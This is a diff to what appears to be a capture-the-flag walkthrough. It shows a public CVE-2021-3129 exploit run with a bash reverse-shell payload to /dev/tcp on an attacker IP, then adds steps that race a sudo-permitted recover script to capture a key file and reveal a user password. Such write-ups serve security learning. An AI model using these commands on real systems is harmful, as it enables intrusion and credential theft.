@@ -61,5 +61,18 @@ https://github.com/zhzyker/CVE-2021-3129 and using https://raw.githubusercontent
 
 `python3 exploit.py http://10.10.10.7:8000 Monolog/RCE1 'bash -c "exec bash -i &>/dev/tcp/10.33.1.86/4444 <&1"'`
 
-# CVE-2021-3156 for PE
+# Recover.sh
 
+sudo can run /opt/recover.sh as pwnx. The script copy a .key in a sub folder do some check and remove the folder.
+
+Add a script in loop as 
+
+```
+#!/bin/bash
+
+while : ; do
+  find /tmp -name .key -exec /usr/bin/cat {} >> /tmp/paraflu \;
+done
+```
+
+set to background and run `sudo -u pwnx /opt/recover.sh` and get the password `^vV4Mm2d`. Login as pwnx with that password and get the flag
